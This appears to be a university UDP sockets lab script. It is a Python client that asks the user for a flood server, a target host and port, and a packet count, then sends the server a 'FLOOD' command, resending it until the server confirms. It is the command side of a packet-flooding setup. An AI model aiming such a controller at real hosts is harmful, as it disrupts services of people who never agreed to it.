#Sam Decanio
#Philip Porter
#Vlad Synnes
#UDP Sockets Lab
#4/2/17

import socket
import time
import threading

#functions
def send_request():
    print("Request sent")
    message = "FLOOD %s %d %d" % (target_host, target_port, count_packets)
    client.sendto(message.encode(),(server_host, server_port))

    global global_timer
    global_timer = threading.Timer(2.0, send_request)
    global_timer.start()

#main code
server        = input("What is the IP/port of the flood server?: ").split(' ')
server_host   = server[0]
server_port   = int(server[1])

flood_target  = input("What is the IP/port of the  target host?: ").split(' ')
target_host   = flood_target[0]
target_port   = int(flood_target[1])

count_packets = int(input("How many packets?: "))

#creating a socket
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
client.bind(('', 9012))

#declare variable for resend timer
global_timer = None

#sending request, function returns a timer object that 
send_request()

#check to see that message gets to server
recieved_confirmation = False
while recieved_confirmation is False:
    confirmation = client.recvfrom(4096)[0].decode('utf-8').split(':')[0]
    recieved_confirmation = (confirmation == 'Request received')

global_timer.cancel()

#receive something back
while True:
    data = client.recvfrom(4096)
    print ("\nServer response is:\n%s" % data[0].decode('utf-8'))